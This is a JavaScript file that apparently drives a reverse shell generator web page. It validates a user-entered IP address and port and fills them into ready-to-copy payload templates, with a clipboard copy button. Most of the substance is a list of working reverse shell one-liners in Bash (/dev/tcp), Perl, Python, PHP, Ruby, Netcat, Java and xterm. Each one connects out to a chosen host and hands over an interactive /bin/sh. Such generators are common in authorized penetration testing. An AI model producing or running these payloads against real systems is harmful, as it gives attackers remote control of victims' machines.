const errorContainer = document.querySelector('.displayerror');

var myTextarea = document.getElementById("editor");
var myCodeMirror = CodeMirror.fromTextArea(myTextarea, {
    value: 'bash -i >& /dev/tcp/${ipValue}/${portValue} 0>&1',
    mode: "shell",
    theme: "dracula",
    lineNumbers: false,
    lineWrapping: true,
});

function setValue() {
    let submenu = document.getElementById('subMenu-1');
    let chooseElement = document.querySelector('.choose span');
    let groupTypeInputHidden = document.getElementById('shelltype');
    let outerSubmenu = document.querySelector('.shell-type');
    if (submenu && chooseElement && groupTypeInputHidden && outerSubmenu) {
        function toggleMenu() {
            outerSubmenu.classList.toggle('open');
        }

        let shellContainer = document.querySelector('.choose');
        shellContainer.addEventListener('click', toggleMenu);

        let dropdownOptions = document.querySelectorAll('.submenu-option');
        dropdownOptions.forEach(option => {
            option.addEventListener('click', function () {
                groupTypeInputHidden.value = option.innerText;
                chooseElement.innerText = option.innerText;
                toggleMenu();
            });
        });
    }
}

document.addEventListener('DOMContentLoaded', setValue);


let ip = document.querySelector('#ip')
let port = document.querySelector('#port')
let card3 = document.querySelector('.card-3')
let shell = document.querySelector('#shelltype')
let title = document.querySelector('.title')
console.log(ip,port,card3,shell,title);
inputValidation(ip, port, shell, title);


function displayError() {
    errorContainer.classList.toggle('popup');
    setTimeout(() => {
        errorContainer.classList.remove('popup');
    }, 2000);
}


function checkIP(ipValue) {
    var ipv4Pattern = /^(\d{1,3}\.){3}(\d{1,3})$/;
    return ipv4Pattern.test(ipValue);
}


function checkPort(portValue) {
    if (isNaN(portValue)) {
        return false;
    }
    if (!Number.isInteger(portValue)) {
        return false;
    }
    if (portValue < 1 || portValue > 65535) {
        return false;
    }
    return true;
}

function inputValidation(ip, port, shell, title) {
    const ipValue = ip.value;
    const portValue = port.value;
    const parsedPort = parseInt(portValue, 10);
    const shellName = shell.value;

    if (!isNaN(parsedPort) && checkIP(ipValue) && checkPort(parsedPort)) {
        ip.style.border = "none"
        port.style.border = "none"
        updateShell(ipValue, parsedPort, shellName, title);
    } else {
        ip.style.border = "2px solid red"
        port.style.border = "2px solid red"
        console.log("na bro");
        displayError();
    }
}

function copyCommand() {
    const commandText = myCodeMirror.getValue();

    const textarea = document.createElement('textarea');
    textarea.value = commandText;
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        let btn = document.querySelector('#btn')
        btn.textContent = "Copied!";
        setTimeout(() => {
            btn.textContent = "Copy!";
        }, 2000);
    } catch (err) {
        console.error('Unable to copy text');
    } finally {
        document.body.removeChild(textarea);
    }
}


function copyCommand1() {
    const clipboard = document.querySelector('.ri-clipboard-line');
    const copied = document.querySelector('.ri-check-line');
    const commandText = myCodeMirror.getValue();
    const textarea = document.createElement('textarea');
    textarea.value = commandText;
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        clipboard.classList.toggle('clicked');
        copied.classList.toggle('clicked');

        setTimeout(() => {
            clipboard.classList.remove('clicked');
            copied.classList.remove('clicked');
        }, 3000);

    } catch (err) {
        console.error('Unable to copy text');
    } finally {
        document.body.removeChild(textarea);
    }
}


function generateReverseShells(ipValue, portValue) {
    const reverseShells = [
        {
            id: 1,
            name: 'Bash',
            shell: `bash -i >& /dev/tcp/${ipValue}/${portValue} 0>&1`
        },
        {
            id: 2,
            name: 'PERL',
            shell: `perl -e 'use Socket;\$i="${ipValue}";\$p=${portValue};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        },
        {
            id: 3,
            name: 'Python',
            shell: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ipValue}",${portValue}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
        },
        {
            id: 4,
            name: 'PHP',
            shell: `php -r '\$sock=fsockopen("${ipValue}",${portValue});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        },
        {
            id: 5,
            name: 'Ruby',
            shell: `ruby -rsocket -e'f=TCPSocket.open("${ipValue}",${portValue}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
        },
        {
            id: 6,
            name: 'Netcat',
            shell: `nc -e /bin/sh ${ipValue} ${portValue}`,
        },
        {
            id: 7,
            name: 'Java',
            shell: `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ipValue}/${portValue};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
        },
        {
            id: 8,
            name: 'xterm',
            shell: `xterm -display ${ipValue}:${portValue}`,
        },
    ];
    console.log('Generated Reverse Shells:', reverseShells);

    return reverseShells;
}

function updateShell(ipValue, portValue, shellName) {
    console.log("iam running");
    let reverseShells = generateReverseShells(ipValue, portValue);
    let selectShell = reverseShells.find(shell => shell.name === shellName);
    console.log(selectShell.shell);
    if (selectShell) {
        title.textContent = selectShell.name;
        myCodeMirror.setValue(selectShell.shell)
    } else {
        console.log("not found");
    }
}

function getText(ip, port, shell, title) {
    console.log("going in");
    ip.addEventListener('input', () => inputValidation(ip, port, shell, title));
    port.addEventListener('input', () => inputValidation(ip, port, shell, title));
    card3.addEventListener('click', () => inputValidation(ip, port, shell, title));
}

getText(ip, port, shell);

